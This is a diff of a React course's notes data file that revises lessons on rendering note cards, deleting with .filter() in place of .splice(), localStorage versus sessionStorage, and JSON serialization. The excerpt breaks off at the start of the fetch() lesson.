-      shortLabel: "Notes App: Render & Splice Delete",
-      title: "Rendering Note Cards & Deleting Notes With .splice(idx, 1)",
-      summary: "Mapping notes array to sticky note cards, delete handler with copyTask.splice(idx, 1), lexical variable scoping, and full Notes App production code.",
-      subtopicLabels: ["30.1 Deleting Notes with splice(idx, 1)", "30.2 Full Notes App Code & Memory Lifecycle"],
+      shortLabel: "Rendering Cards & Deleting Notes",
+      title: "Rendering Note Cards & Deleting Notes With .splice(idx, 1) vs. .filter()",
+      summary: "Rendering collections via .map(), the subtle mutation flaw of Array.prototype.splice() in React state, and the pure immutable deletion standard using .filter().",
+      subtopicLabels: ["30.1 Rendering Collection Grids with .map()", "30.2 The .splice() Mutation Trap vs Pure .filter()"],
       diagramCount: 2,
       sections: [
         {
           num: "30.1",
-          title: "Deleting a Specific Note Using idx & copyTask.splice(idx, 1)",
+          title: "Rendering Collection Grids With .map() & Unique Keys",
           content: `
+            <p>
+              To render an arbitrary number of note cards dynamically, React developers iterate through the state array using JavaScript's pure <code>.map()</code> function.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Targeted Deletion via Array Index (<code>idx</code>):</strong>
+              <li><strong>The Golden Requirements for Rendering Lists:</strong>
                 <ul class="notes-sub-list">
-                  <li>When looping with <code>task.map((elem, idx) =&gt; ...)</code>, attach an arrow function wrapper to the delete button:
-                    <pre class="notes-code-block"><code>onClick={() => deleteNote(idx)}</code></pre>
-                  </li>
-                  <li><strong>Inside <code>deleteNote(idx)</code>:</strong>
-                    <ol class="notes-sub-list">
-                      <li>Copy the master array: <code>const copyTask = [...task]</code>.</li>
-                      <li>Remove exactly 1 item at index <code>idx</code>: <code>copyTask.splice(idx, 1)</code>.</li>
-                      <li>Update state: <code>setTask(copyTask)</code>.</li>
-                    </ol>
-                  </li>
+                  <li>Every top-level element returned from <code>.map()</code> <strong>must have a unique, stable <code>key</code> prop</strong> (such as <code>note.id</code>).</li>
+                  <li><strong>Why Never Use Array Index as Key for Deletions:</strong> If you use <code>key={index}</code> and delete the item at index 0, React confuses the identities of the remaining items, causing ghost input values, animation glitches, and broken DOM synchronization!</li>
                 </ul>
               </li>
-              <li><strong>Lexical Scope Note:</strong> Reusing the variable name <code>copyTask</code> inside both <code>submitHandler</code> and <code>deleteNote</code> causes zero collisions because each <code>const copyTask</code> is lexically block-scoped to its own function.</li>
             </ul>
 
             <figure class="diagram-frame">
@@ -6067,101 +6509,83 @@ export default App</code></pre>
         },
         {
           num: "30.2",
-          title: "Complete Notes App Code (App.jsx — Production Logic)",
+          title: "The .splice() Mutation Trap vs. Pure Immutable .filter()",
           content: `
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
+            <p>
+              In traditional JavaScript courses, deleting an element at an index is taught using <code>array.splice(index, 1)</code>. However, in React, <strong>using <code>splice()</code> on state is an architectural anti-pattern</strong>.
+            </p>
 
-const App = () => {
-  const [title, setTitle] = useState('')
-  const [details, setDetails] = useState('')
-  const [task, setTask] = useState([])
+            <ul class="notes-bullet-list">
+              <li><strong>Why <code>notes.splice(index, 1)</code> Fails in React:</strong>
+                <ul class="notes-sub-list">
+                  <li><code>Array.prototype.splice()</code> is a <strong>mutating method</strong>—it alters the original array directly in memory.</li>
+                  <li>If you do <code>notes.splice(idx, 1); setNotes(notes);</code>, the memory reference of <code>notes</code> has not changed! React performs its equality check: <code>Object.is(prevNotes, nextNotes)</code> &rarr; <code>true</code> &rarr; React bails out and refuses to update the UI!</li>
+                  <li>Even if you clone the array first with <code>const copy = [...notes]; copy.splice(idx, 1); setNotes(copy);</code>, it requires multi-line ceremony.</li>
+                </ul>
+              </li>
+              <li><strong>The Senior Standard — Pure <code>.filter()</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li><code>.filter()</code> never mutates the original array; it always creates and returns a brand-new array containing only the items that pass the predicate test.</li>
+                  <li>Deleting by ID or Index in one elegant, declarative line:
+                    <pre class="notes-code-block"><code>// Delete by ID (Best Practice):
+const deleteNote = (targetId) => {
+  setNotes(prev => prev.filter(note => note.id !== targetId));
+};
 
-  const submitHandler = (e) => {
-    e.preventDefault()
+// Delete by Index:
+const deleteByIndex = (targetIndex) => {
+  setNotes(prev => prev.filter((_, idx) => idx !== targetIndex));
+};</code></pre>
+                  </li>
+                </ul>
+              </li>
+            </ul>
 
-    const copyTask = [...task]
-    copyTask.push({ title, details })
-    setTask(copyTask)
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
 
-    setTitle('')
-    setDetails('')
-  }
+function NotesGrid({ initialNotes = [] }) {
+  const [notes, setNotes] = useState(initialNotes);
 
-  const deleteNote = (idx) => {
-    const copyTask = [...task]
-    copyTask.splice(idx, 1)
-    setTask(copyTask)
+  const handleDelete = (id) => {
+    // Pure, immutable deletion without mutating state
+    setNotes(prevNotes => prevNotes.filter(note => note.id !== id));
+  };
+
+  if (notes.length === 0) {
+    return (
+      &lt;div className="p-8 text-center border-2 border-dashed rounded-xl text-text-muted"&gt;
+        No notes available. Add a new note above to get started!
+      &lt;/div&gt;
+    );
   }
 
   return (
-    &lt;div className="h-screen lg:flex bg-black text-white"&gt;
-      {/* Left Section: Add Notes Form */}
-      &lt;form
-        onSubmit={(e) => {
-          submitHandler(e)
-        }}
-        className="flex gap-4 lg:w-1/2 p-10 flex-col items-start"
-      &gt;
-        &lt;h1 className="text-4xl mb-2 font-bold"&gt;Add Notes&lt;/h1&gt;
-
-        &lt;input
-          type="text"
-          placeholder="Enter Notes Heading"
-          className="px-5 w-full font-medium py-2 border-2 outline-none rounded bg-neutral-900"
-          value={title}
-          onChange={(e) => {
-            setTitle(e.target.value)
-          }}
-        /&gt;
-
-        &lt;textarea
-          className="px-5 w-full font-medium h-32 py-2 border-2 outline-none rounded bg-neutral-900"
-          placeholder="Write Details here"
-          value={details}
-          onChange={(e) => {
-            setDetails(e.target.value)
-          }}
-        /&gt;
-
-        &lt;button className="bg-white active:scale-95 font-medium w-full text-black px-5 py-2 rounded"&gt;
-          Add Note
-        &lt;/button&gt;
-      &lt;/form&gt;
-
-      {/* Right Section: Recent Notes */}
-      &lt;div className="lg:w-1/2 lg:border-l-2 p-10"&gt;
-        &lt;h1 className="text-4xl font-bold"&gt;Recent Notes&lt;/h1&gt;
-        &lt;div className="flex flex-wrap items-start justify-start gap-5 mt-6 h-[90%] overflow-auto"&gt;
-          {task.map(function (elem, idx) {
-            return (
-              &lt;div
-                key={idx}
-                className="flex justify-between flex-col items-start h-52 w-40 rounded-xl text-black pt-6 pb-4 px-4 bg-amber-100 shadow-md"
-              &gt;
-                &lt;div&gt;
-                  &lt;h3 className="leading-tight text-lg font-bold"&gt;{elem.title}&lt;/h3&gt;
-                  &lt;p className="mt-2 leading-tight text-xs font-semibold text-gray-700"&gt;
-                    {elem.details}
-                  &lt;/p&gt;
-                &lt;/div&gt;
-                &lt;button
-                  onClick={() => {
-                    deleteNote(idx)
-                  }}
-                  className="w-full active:scale-95 bg-red-500 py-1 text-xs rounded font-bold text-white"
-                &gt;
-                  Delete
-                &lt;/button&gt;
-              &lt;/div&gt;
-            )
-          })}
+    &lt;div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4"&gt;
+      {notes.map(note => (
+        &lt;div 
+          key={note.id} 
+          className="p-5 bg-card border rounded-xl shadow-sm flex flex-col justify-between"
+        &gt;
+          &lt;div&gt;
+            &lt;h4 className="font-bold text-lg text-text-primary"&gt;{note.title}&lt;/h4&gt;
+            &lt;p className="mt-2 text-sm text-text-secondary leading-relaxed"&gt;{note.content}&lt;/p&gt;
+          &lt;/div&gt;
+          &lt;div className="mt-4 pt-3 border-t flex justify-between items-center"&gt;
+            &lt;span className="text-xs text-text-muted"&gt;{note.createdAt}&lt;/span&gt;
+            &lt;button 
+              onClick={() => handleDelete(note.id)}
+              className="px-2.5 py-1 text-xs font-semibold text-red-600 hover:bg-red-50 dark:hover:bg-red-950 rounded transition"
+            &gt;
+              Delete Note
+            &lt;/button&gt;
+          &lt;/div&gt;
         &lt;/div&gt;
-      &lt;/div&gt;
+      ))}
     &lt;/div&gt;
-  )
+  );
 }
 
-export default App</code></pre>
+export default NotesGrid;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6173,8 +6597,8 @@ export default App</code></pre>
                   <!-- Memory State -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
-                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--border)"/>
-                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">CURRENT: VOLATILE RAM</text>
+                    <rect x="15" y="15" width="182" height="20" rx="4" fill="var(--border)"/>
+                    <text x="106" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">CURRENT: VOLATILE RAM</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title">useState In-Memory Heap</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6186,8 +6610,8 @@ export default App</code></pre>
                   <!-- LocalStorage -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">NEXT CHAPTER: PERSISTENCE</text>
+                    <rect x="15" y="15" width="212" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="121" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">NEXT CHAPTER: PERSISTENCE</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Browser localStorage API</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6204,32 +6628,44 @@ export default App</code></pre>
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 31: BROWSER STORAGE — LOCALSTORAGE VS. SESSIONSTORAGE & CORE METHODS
+       TOPIC 31
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-31-localstorage-vs-sessionstorage",
+      id: "react-31-browser-storage-local-session",
       number: "31",
-      shortLabel: "LocalStorage vs. SessionStorage",
+      shortLabel: "Browser Storage — Local vs Session",
       title: "Browser Storage — LocalStorage vs. SessionStorage & Core Methods",
-      summary: "Client-side persistence mechanics, key-value storage lifecycles, SessionStorage ephemeral tabs vs. LocalStorage permanent disk persistence, and the 4 core CRUD methods.",
-      subtopicLabels: ["31.1 Storage Lifecycles", "31.2 Core Storage Methods", "31.3 DevTools Inspection"],
+      summary: "Client-side key-value storage mechanisms, lifespan and scope comparison between localStorage and sessionStorage, synchronous API blocking gotchas, and the 4 fundamental CRUD methods.",
+      subtopicLabels: ["31.1 LocalStorage vs SessionStorage Lifespan", "31.2 The 4 Essential Storage Methods & DevTools Inspection"],
       diagramCount: 2,
       sections: [
         {
           num: "31.1",
-          title: "LocalStorage vs. SessionStorage: Key Differences",
+          title: "LocalStorage vs. SessionStorage Lifespan & Scope",
           content: `
+            <p>
+              When a user interacts with a React application, standard React state (<code>useState</code>) lives exclusively in the browser's <strong>volatile RAM memory</strong>. The instant the user hits refresh (F5), closes the tab, or shuts down their computer, all memory state evaporates into thin air.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>What Is Client-Side Web Storage?</strong>
+              <li><strong>Why We Need Web Storage APIs:</strong>
                 <ul class="notes-sub-list">
-                  <li>Both <strong>LocalStorage</strong> and <strong>SessionStorage</strong> are synchronous, sandboxed key-value databases built directly into the browser (via Web Storage API).</li>
-                  <li>Storage is scoped per <strong>Origin</strong> (Protocol + Domain + Port). Neither transmits data over HTTP headers like cookies do, giving fast local access up to <strong>5MB - 10MB</strong>.</li>
+                  <li>To preserve user settings (e.g. Dark Mode preferences, unfinished draft forms, shopping cart items) across page reloads without making expensive network calls to a cloud database every second.</li>
                 </ul>
               </li>
-              <li><strong>Storage Lifespan Comparison:</strong>
+              <li><strong>SessionStorage Mechanics:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>SessionStorage:</strong> Data lives <strong>only for the duration of the browser tab session</strong>. Closing the tab or browser immediately destroys all stored records. Duplicating a tab creates a new isolated copy.</li>
-                  <li><strong>LocalStorage:</strong> Data persists <strong>permanently across sessions</strong>. Survives tab closures, browser restarts, and operating system reboots until programmatically cleared or manually wiped by the user.</li>
+                  <li><strong>Lifespan:</strong> Scoped strictly to the lifetime of the <strong>active browser tab</strong>.</li>
+                  <li>Survives page reloads within the same tab, but the moment the tab or browser window is closed, all data is automatically erased.</li>
+                  <li>Opening the same URL in a new tab creates a completely separate, isolated <code>sessionStorage</code> instance.</li>
+                </ul>
+              </li>
+              <li><strong>LocalStorage Mechanics:</strong>
+                <ul class="notes-sub-list">
+                  <li><strong>Lifespan:</strong> <strong>Permanent</strong> persistence scoped to the origin (protocol + domain + port).</li>
+                  <li>Data persists across tab closes, browser restarts, and even computer reboots until explicitly cleared by the user or programmatically by your code.</li>
+                  <li>Shared synchronously across all open tabs of the same origin.</li>
+                  <li><strong>Capacity:</strong> Typically <strong>~5MB to 10MB</strong> per origin (vastly larger than the 4KB limit of HTTP cookies).</li>
                 </ul>
               </li>
             </ul>
@@ -6275,34 +6711,33 @@ export default App</code></pre>
         },
         {
           num: "31.2",
-          title: "The 4 Essential LocalStorage CRUD Methods",
+          title: "The 4 Essential Storage Methods & DevTools Inspection",
           content: `
+            <p>
+              Both <code>localStorage</code> and <code>sessionStorage</code> share the identical W3C Storage API interface based on <strong>Key-Value string pairs</strong>.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>Key-Value String Protocol:</strong> Both the <code>key</code> and the <code>value</code> passed to storage methods <strong>must be strings</strong>.</li>
-              <li><strong>The 4 Storage Operations:</strong>
+              <li><strong>The 4 Core Storage Methods:</strong>
+                <pre class="notes-code-block"><code>// 1. CREATE / UPDATE: Store a key-value pair (both must be strings)
+localStorage.setItem('theme', 'dark');
+
+// 2. READ: Retrieve value by key (returns null if key does not exist)
+const currentTheme = localStorage.getItem('theme'); // 'dark'
+
+// 3. DELETE ONE: Remove a specific key
+localStorage.removeItem('theme');
+
+// 4. CLEAR ALL: Wipe every key stored under this domain origin
+localStorage.clear();</code></pre>
+              </li>
+              <li><strong>Production Engineering Gotchas:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong><code>setItem(key, value)</code>:</strong> Inserts a new key-value pair, or overwrites existing key with new value.</li>
-                  <li><strong><code>getItem(key)</code>:</strong> Retrieves the saved string value. If key doesn't exist, returns <code>null</code>.</li>
-                  <li><strong><code>removeItem(key)</code>:</strong> Deletes one specific target key without affecting other keys.</li>
-                  <li><strong><code>clear()</code>:</strong> Wipes all stored keys for that origin simultaneously.</li>
+                  <li><strong>Synchronous Blocking API:</strong> Web Storage APIs run synchronously on the browser's main UI thread. Reading or writing massive multi-megabyte payloads in LocalStorage will freeze the browser frame rate and cause visible UI stutter. Keep stored items compact and structured!</li>
+                  <li><strong>Inspection in Browser DevTools:</strong> Open Chrome DevTools &rarr; Navigate to <strong>Application</strong> tab &rarr; Left sidebar: Expand <strong>Local storage</strong> &rarr; Select your site URL to inspect, edit, or delete keys live in real time!</li>
                 </ul>
               </li>
             </ul>
-
-            <pre class="notes-code-block"><code>// 1. Create / Update (both key &amp; value must be strings)
-localStorage.setItem('user', 'Sarthak');
-
-// 2. Read (returns string, or null if key does not exist)
-const user = localStorage.getItem('user'); // 'Sarthak'
-
-// 3. Delete a specific key
-localStorage.removeItem('user');
-
-// 4. Wipe all keys for this domain
-localStorage.clear();
-
-// Note: The identical 4 methods work on sessionStorage:
-// sessionStorage.setItem('token', 'xyz123');</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6349,8 +6784,8 @@ localStorage.clear();
                   <!-- Chrome DevTools -->
                   <g transform="translate(625, 20)">
                     <rect x="0" y="0" width="230" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">LIVE INSPECTION</text>
+                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">LIVE INSPECTION</text>
                     <text x="115" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Application Tab</text>
 
                     <rect x="15" y="70" width="200" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6368,28 +6803,40 @@ localStorage.clear();
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 32: STORING & RETRIEVING OBJECTS/ARRAYS WITH JSON.STRINGIFY & JSON.PARSE
+       TOPIC 32
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-32-json-stringify-and-parse",
+      id: "react-32-json-stringify-parse-objects",
       number: "32",
-      shortLabel: "JSON.stringify & parse",
+      shortLabel: "JSON.stringify & parse in LocalStorage",
       title: "Storing & Retrieving Objects/Arrays With JSON.stringify & JSON.parse",
-      summary: "Solving the [object Object] serialization bottleneck, converting JavaScript memory trees into JSON strings, and rehydrating arrays and objects on application mount.",
-      subtopicLabels: ["32.1 The [object Object] Trap", "32.2 Serialization Pipeline", "32.3 Array & Object Hydration"],
+      summary: "Solving the [object Object] storage corruption flaw, deep serialization with JSON.stringify, deserialization with JSON.parse, and defensive try-catch fallback handling in React.",
+      subtopicLabels: ["32.1 The [object Object] Stringification Trap", "32.2 Serialization & Deserialization Pipeline (JSON.stringify & parse)"],
       diagramCount: 2,
       sections: [
         {
           num: "32.1",
-          title: "The [object Object] Trap (Why Direct Storage Fails)",
+          title: "The [object Object] Stringification Trap",
           content: `
+            <p>
+              A major surprise for junior developers is discovering that <strong>LocalStorage can ONLY store strings</strong>. It has zero native support for JavaScript objects, arrays, booleans, or numbers.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Underlying Problem:</strong>
+              <li><strong>The Fatal Mistake:</strong>
+                <pre class="notes-code-block"><code>const user = { name: 'Sarthak', role: 'Engineer' };
+
+// ❌ FATAL BUG: Passing object directly into setItem:
+localStorage.setItem('user', user);
+
+// When reading it back:
+const saved = localStorage.getItem('user');
+console.log(saved); // Prints: "[object Object]"! All properties lost forever!</code></pre>
+              </li>
+              <li><strong>Why Does This Happen?</strong>
                 <ul class="notes-sub-list">
-                  <li>LocalStorage accepts <strong>only primitive strings</strong> as storage values.</li>
-                  <li>When you pass a raw JavaScript object into <code>localStorage.setItem('user', user)</code>, JavaScript implicitly invokes its default string coercion: <code>user.toString()</code>.</li>
-                  <li>The default <code>toString()</code> on generic JS objects produces the useless literal string <strong><code>&quot;[object Object]&quot;</code></strong>!</li>
-                  <li>All your keys (<code>username</code>, <code>age</code>, <code>city</code>) are permanently lost because the data structure was flattened into an opaque string token.</li>
+                  <li>When JavaScript encounters a non-string value passed into <code>setItem(key, value)</code>, it implicitly calls <code>.toString()</code> on the value.</li>
+                  <li>In JavaScript, calling <code>{}.toString()</code> evaluates to the useless string literal <code>"[object Object]"</code>! Your original object data is completely obliterated.</li>
                 </ul>
               </li>
             </ul>
@@ -6404,8 +6851,8 @@ localStorage.clear();
                   <!-- BAD: Implicit toString() -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT WAY ✕</text>
+                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT WAY ✕</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Direct Object Coercion</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -6418,8 +6865,8 @@ localStorage.clear();
                   <!-- GOOD: JSON.stringify -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="120" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="75" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT WAY ✓</text>
+                    <rect x="15" y="15" width="123" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="76.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT WAY ✓</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">JSON Serialization</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -6435,42 +6882,59 @@ localStorage.clear();
         },
         {
           num: "32.2",
-          title: "Saving & Reading Objects Properly With stringify & parse",
+          title: "Serialization & Deserialization Pipeline With Defensive Error Guards",
           content: `
+            <p>
+              To safely store complex JavaScript objects or arrays in LocalStorage, we use a two-step serialization pipeline:
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Two-Step Persistence Handshake:</strong>
+              <li><strong>Step 1: Serialization via <code>JSON.stringify()</code>:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Write Phase (Heap Object → Storage):</strong> Use <strong><code>JSON.stringify(data)</code></strong> to encode your JavaScript object or array into a valid JSON string.</li>
-                  <li><strong>Read Phase (Storage → Heap Object):</strong> Use <strong><code>JSON.parse(string)</code></strong> to rehydrate the stored string back into a live JavaScript memory object.</li>
+                  <li>Converts the JavaScript in-memory object into a valid, UTF-8 formatted JSON string:
+                    <br><code>const jsonString = JSON.stringify(user);</code>
+                    <br>&rarr; Result: <code>'{"name":"Sarthak","role":"Engineer"}'</code>
+                  </li>
+                  <li>Now you can safely call: <code>localStorage.setItem('user', jsonString);</code></li>
                 </ul>
               </li>
-              <li><strong>Critical Production Guardrail:</strong> Always safeguard <code>JSON.parse()</code> with fallback initialization (e.g. <code>JSON.parse(localStorage.getItem('tasks')) || []</code>) to prevent parsing <code>null</code> when a user visits the app for the first time.</li>
+              <li><strong>Step 2: Deserialization via <code>JSON.parse()</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li>When reading back, parse the stored string back into a living JavaScript object:
+                    <br><code>const userObj = JSON.parse(localStorage.getItem('user'));</code>
+                  </li>
+                </ul>
+              </li>
+              <li><strong>Defensive Parsing Guard (Production Standard):</strong>
+                <ul class="notes-sub-list">
+                  <li>If LocalStorage is empty or contains malformed JSON, <code>JSON.parse()</code> throws an unhandled SyntaxError that crashes the entire React application! Always wrap deserialization in a <code>try...catch</code> block:</li>
+                </ul>
+              </li>
             </ul>
 
-            <pre class="notes-code-block"><code>// Sample user object in JavaScript memory
-const user = {
-  username: 'Sarthak',
-  age: 18,
-  city: 'Bhopal'
-};
+            <pre class="notes-code-block"><code>// Production Helper Utility for LocalStorage Access:
+export const storageService = {
+  // Safe write
+  save: (key, data) => {
+    try {
+      const serialized = JSON.stringify(data);
+      localStorage.setItem(key, serialized);
+    } catch (err) {
+      console.error('Failed to save to localStorage:', err);
+    }
+  },
 
-// 1. SAVE: Convert Object -&gt; JSON string before saving
-localStorage.setItem('user', JSON.stringify(user));
-
-// 2. RETRIEVE: Read JSON string and parse back -&gt; JS Object
-const storedUser = JSON.parse(localStorage.getItem('user'));
-
-console.log(storedUser.username); // 'Sarthak'
-console.log(storedUser.city);     // 'Bhopal'
-
-// Persisting Arrays of Objects (Notes App Tasks pattern):
-const tasks = [
-  { id: 1, title: 'Learn React State' },
-  { id: 2, title: 'Master LocalStorage' }
-];
-
-localStorage.setItem('all-tasks', JSON.stringify(tasks));
-const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code></pre>
+  // Safe read with fallback default
+  load: (key, defaultValue = null) => {
+    try {
+      const item = localStorage.getItem(key);
+      return item ? JSON.parse(item) : defaultValue;
+    } catch (err) {
+      console.warn('Malformed data found for key "' + key + '", returning default:', err);
+      return defaultValue;
+    }
+  }
+};</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -6482,8 +6946,8 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
                   <!-- JavaScript In-Memory Heap -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JS IN-MEMORY HEAP</text>
+                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JS IN-MEMORY HEAP</text>
                     <text x="130" y="58" text-anchor="middle" class="svg-title">Live Object / Array</text>
 
                     <rect x="15" y="74" width="230" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -6496,20 +6960,20 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
                   <!-- Top Arrow: JSON.stringify() -->
                   <path d="M 295 85 L 435 85" stroke="var(--primary)" stroke-width="2"/>
                   <polygon points="435,81 443,85 435,89" fill="var(--primary)"/>
-                  <rect x="305" y="62" width="130" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
-                  <text x="370" y="76" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JSON.stringify()</text>
+                  <rect x="305" y="62" width="145" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
+                  <text x="377.5" y="76" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JSON.stringify()</text>
 
                   <!-- Bottom Arrow: JSON.parse() -->
                   <path d="M 435 155 L 295 155" stroke="var(--success)" stroke-width="2"/>
                   <polygon points="295,151 287,155 295,159" fill="var(--success)"/>
-                  <rect x="315" y="160" width="110" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
-                  <text x="370" y="174" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">JSON.parse()</text>
+                  <rect x="315" y="160" width="115" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
+                  <text x="372.5" y="174" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">JSON.parse()</text>
 
                   <!-- Browser LocalStorage Disk -->
                   <g transform="translate(450, 20)">
                     <rect x="0" y="0" width="405" height="190" rx="10" fill="var(--bg-surface)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">BROWSER LOCALSTORAGE</text>
+                    <rect x="15" y="15" width="174" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="102" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">BROWSER LOCALSTORAGE</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Serialized String Buffer</text>
 
                     <rect x="15" y="74" width="375" height="100" rx="6" fill="var(--bg-subsection)" stroke="var(--success)"/>
@@ -6526,27 +6990,36 @@ const loadedTasks = JSON.parse(localStorage.getItem('all-tasks')) || [];</code><
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 33: CALLING APIS WITH FETCH() & ASYNC / AWAIT
+       TOPIC 33
        ═══════════════════════════════════════════════════════════════ */
     {
       id: "react-33-calling-apis-with-fetch-async-await",
       number: "33",
       shortLabel: "APIs With fetch() & async",
       title: "Calling APIs With fetch() & async / await",
-      summary: "Client-server API architectures, native fetch() vs. Axios, understanding pending asynchronous promises, and the two-stage await stream handshake.",
-      subtopicLabels: ["33.1 fetch vs Axios", "33.2 Sync vs Async Promises", "33.3 Two-Stage await Stream"],
+      summary: "Client-server API architectures, native fetch() vs. Axios, understanding pending asynchronous promises, the two-stage await stream handshake, and handling HTTP error statuses.",
+      subtopicLabels: ["33.1 fetch vs Axios & The Event Loop", "33.2 Synchronous Code vs Asynchronous Promises", "33.3 The Two-Stage Handshake (res.json()) & Error Handling"],
       diagramCount: 2,
       sections: [
         {
           num: "33.1",
-          title: "Two Ways to Call APIs in React (fetch vs. axios)",
+          title: "fetch() vs. Axios & The Asynchronous Event Loop",
           content: `
+            <p>
